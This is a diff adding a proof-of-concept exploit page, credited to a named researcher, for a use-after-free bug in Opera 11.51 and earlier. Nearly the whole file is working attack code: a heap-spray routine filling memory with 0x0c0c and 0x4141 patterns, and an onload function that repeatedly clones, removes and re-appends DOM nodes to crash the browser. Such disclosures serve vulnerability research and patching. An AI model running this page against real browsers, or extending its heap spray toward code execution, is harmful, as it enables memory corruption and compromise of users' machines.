@@ -1,0 +1,50 @@
+# Exploit Title: Opera Use After Free - Crash PoC
+# Date: 20 October 2011
+# Author: Roberto Suggi Liverani
+# Software Link: www.opera.com
+# Version: 11.51 and previous versions
+# Tested on: Windows XP and Windows 7
+# CVE : n/a
+# Link: http://malerisch.net/docs/advisories/opera_use_after_free_crash_poc.html
+
+<html>
+<head>
+<script>
+
+function spray() {
+for(S="\u0c0c",k=[],y=0;y++<197;)y<20?S+=S:k[y]=[S.substr(22)+"\u4141\u4141"].join("")
+
+}
+
+function crash(){
+// Clone Object -> Remove Object - > Append Reference)
+obj = document.body.children[0].cloneNode(true)
+document.body.removeChild(document.body.children[0])
+document.body.appendChild(obj)
+
+// Clone Object -> Remove Object - > Append Reference)
+obj = document.body.children[0].cloneNode(true)
+document.body.removeChild(document.body.children[0])
+document.body.appendChild(obj)
+
+// Clone Object -> Remove Object - > Append Reference)
+obj = document.body.children[0].cloneNode(true)
+document.body.removeChild(document.body.children[0])
+document.body.appendChild(obj)
+
+// Clone Object -> Remove Object - > Heap Spray
+
+obj = document.body.children[1].cloneNode(true)
+document.body.removeChild(document.body.children[1]);
+spray(); // if this is removed Opera won't crash
+}
+
+</script>
+</head>
+<body onload="crash();">
+
+<em contenteditable="true">a</em>
+<strong contenteditable="true">a</strong>
+
+</body>
+</html>
